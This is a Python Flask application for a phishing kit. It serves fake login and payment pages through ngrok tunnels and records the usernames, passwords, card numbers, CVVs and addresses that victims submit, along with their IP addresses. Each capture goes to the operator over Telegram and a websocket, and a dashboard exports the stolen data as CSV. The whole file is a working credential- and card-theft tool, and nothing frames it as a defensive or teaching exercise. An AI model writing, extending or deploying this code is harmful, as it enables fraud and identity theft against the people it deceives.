from flask import Flask, render_template, request, redirect, url_for, jsonify, abort, send_file
from pyngrok import ngrok
import json
import os
import datetime
import csv
import io
from functools import wraps
from urllib.parse import urlparse
from flask_socketio import SocketIO
from telegram_bot import TelegramBot

# File paths
DATA_DIR = 'data'
CONFIG_FILE = os.path.join(DATA_DIR, 'config.json')
CAPTURED_DATA_FILE = os.path.join(DATA_DIR, 'captured_data.json')
ACTIVE_PAGES_FILE = os.path.join(DATA_DIR, 'active_pages.json')

def load_json_file(file_path, default=None):
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return default if default is not None else {}

def save_json_file(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)

# Load configuration
config = load_json_file(CONFIG_FILE)
if not config:
    config = {
        "ngrok_token": "your_token_here",
        "server": {"host": "0.0.0.0", "port": 5000, "debug": True},
        "security": {"secret_key": "your_secret_key_here"}
    }
    save_json_file(CONFIG_FILE, config)

app = Flask(__name__)
app.secret_key = config['security']['secret_key']
socketio = SocketIO(app)

# Load captured data
CAPTURED_DATA = load_json_file(CAPTURED_DATA_FILE, default=[])

# Load active pages
ACTIVE_PAGES = load_json_file(ACTIVE_PAGES_FILE, default={})

# Initialize Telegram bot
telegram_bot = TelegramBot()

def save_captured_data():
    save_json_file(CAPTURED_DATA_FILE, CAPTURED_DATA)

def save_active_pages():
    # Remove tunnel objects before saving
    pages_to_save = {}
    for page_id, page_data in ACTIVE_PAGES.items():
        pages_to_save[page_id] = {
            'type': page_data['type'],
            'url': page_data['url']
        }
    save_json_file(ACTIVE_PAGES_FILE, pages_to_save)

def is_admin_request():
    path = request.path
    referrer = request.referrer if request.referrer else ''
    
    if '/phish/' in path:
        return False
        
    if 'ngrok' in request.host:
        return False
        
    if request.remote_addr in ['127.0.0.1', 'localhost'] and 'ngrok' not in referrer:
        return True
        
    return False

def admin_only(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not is_admin_request():
            return abort(404)
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
@admin_only
def index():
    return render_template('main/index.html')

@app.route('/main')
@admin_only
def main():
    active_pages_count = len(ACTIVE_PAGES)
    captured_data_count = len(CAPTURED_DATA)
    return render_template('main/main.html', 
                         active_pages_count=active_pages_count,
                         captured_data_count=captured_data_count,
                         captured_data=CAPTURED_DATA)

@app.route('/start')
@admin_only
def start():
    return render_template('main/start.html')

@app.route('/campaigns')
@admin_only
def campaigns():
    return render_template('main/campaigns.html')

@app.route('/data')
@admin_only
def data():
    active_pages_count = len(ACTIVE_PAGES)
    return render_template('main/data.html', 
                         captured_data=CAPTURED_DATA,
                         active_pages_count=active_pages_count)

@app.route('/settings')
@admin_only
def settings():
    return render_template('main/settings.html', config=config)

@app.route('/update_config', methods=['POST'])
@admin_only
def update_config():
    data = request.get_json()
    
    if 'ngrok_token' in data:
        config['ngrok_token'] = data['ngrok_token']
        save_json_file(CONFIG_FILE, config)
        return jsonify({'success': True})
        
    if 'telegram' in data:
        if 'telegram' not in config:
            config['telegram'] = {}
            
        config['telegram'].update(data['telegram'])
        save_json_file(CONFIG_FILE, config)
        
        # Reinitialize Telegram bot with new settings
        global telegram_bot
        telegram_bot = TelegramBot()
        
        return jsonify({'success': True})
        
    return jsonify({'success': False, 'error': 'Invalid configuration'})

@app.route('/create_page', methods=['POST'])
@admin_only
def create_page():
    page_type = request.form.get('page_type')
    if page_type:
        import random
        page_id = f'page_{random.randint(1000, 9999)}'
        
        tunnel = ngrok.connect(config['server']['port'])
        public_url = tunnel.public_url
        
        ACTIVE_PAGES[page_id] = {
            'type': page_type,
            'url': f'{public_url}/phish/{page_id}',
            'tunnel': tunnel
        }
        
        save_active_pages()
        
        return jsonify({
            'success': True,
            'page_id': page_id,
            'url': ACTIVE_PAGES[page_id]['url']
        })
    return jsonify({'success': False, 'error': 'Invalid page type'})

@app.route('/delete_page/<page_id>', methods=['POST'])
@admin_only
def delete_page(page_id):
    if page_id in ACTIVE_PAGES:
        try:
            if 'tunnel' in ACTIVE_PAGES[page_id]:
                ACTIVE_PAGES[page_id]['tunnel'].disconnect()
        except:
            pass
        
        del ACTIVE_PAGES[page_id]
        save_active_pages()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Page not found'})

@app.route('/phish/<page_id>')
def phishing_page(page_id):
    if page_id in ACTIVE_PAGES:
        page_type = ACTIVE_PAGES[page_id]['type']
        return render_template(f'phishing/phish_{page_type}.html', page_id=page_id)
    return abort(404)

@app.route('/submit_data', methods=['POST'])
def submit_data():
    data = request.form.to_dict()
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data['ip_address'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent')
    
    CAPTURED_DATA.append(data)
    save_captured_data()
    
    # Format message for Telegram
    message = telegram_bot.format_capture_message(data)
    
    # Send to Telegram
    telegram_bot.send_message(message)
    
    # Emit notification through WebSocket
    socketio.emit('new_capture', data)
    
    return '', 204

@app.route('/clear_data', methods=['POST'])
@admin_only
def clear_data():
    global CAPTURED_DATA
    CAPTURED_DATA = []
    save_captured_data()
    return jsonify({'success': True})

@app.route('/get_counts')
@admin_only
def get_counts():
    return jsonify({
        'active_pages': len(ACTIVE_PAGES),
        'captured_data': len(CAPTURED_DATA)
    })

@app.route('/get_active_pages')
@admin_only
def get_active_pages():
    # Convert active pages to a format suitable for JSON response
    pages_data = {}
    for page_id, page_data in ACTIVE_PAGES.items():
        pages_data[page_id] = {
            'type': page_data['type'],
            'url': page_data['url']
        }
    return jsonify(pages_data)

@app.route('/export_csv')
@admin_only
def export_csv():
    # Create a StringIO object to write the CSV data
    si = io.StringIO()
    writer = csv.writer(si)
    
    # Write headers
    writer.writerow(['Timestamp', 'Campaign Type', 'Username/Card Holder', 'Password/Card Number', 'IP Address', 'User Agent', 
                    'Expiry Month', 'Expiry Year', 'CVV', 'Address', 'ZIP Code'])
    
    # Write data rows
    for entry in CAPTURED_DATA:
        row = [
            entry.get('timestamp', ''),
            entry.get('page_type', ''),
            entry.get('username', entry.get('card_holder', '')),
            entry.get('password', entry.get('card_number', '')),
            entry.get('ip_address', ''),
            entry.get('user_agent', ''),
            entry.get('expiry_month', ''),
            entry.get('expiry_year', ''),
            entry.get('cvv', ''),
            entry.get('address', ''),
            entry.get('zip_code', '')
        ]
        writer.writerow(row)
    
    # Get the value and encode it
    output = si.getvalue().encode('utf-8')
    si.close()
    
    # Create a BytesIO object
    bio = io.BytesIO()
    bio.write(output)
    bio.seek(0)
    
    # Generate timestamp for filename
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    
    return send_file(
        bio,
        mimetype='text/csv',
        as_attachment=True,
        download_name=f'captured_data_{timestamp}.csv'
    )

@app.errorhandler(404)
def page_not_found(e):
    return 'Page not found', 404

if __name__ == '__main__':
    # Create data directory if it doesn't exist
    os.makedirs(DATA_DIR, exist_ok=True)
    
    # Start ngrok
    ngrok.set_auth_token(config['ngrok_token'])
    
    # Start the server
    socketio.run(app, 
                host=config['server']['host'],
                port=config['server']['port'],
                debug=config['server']['debug']) 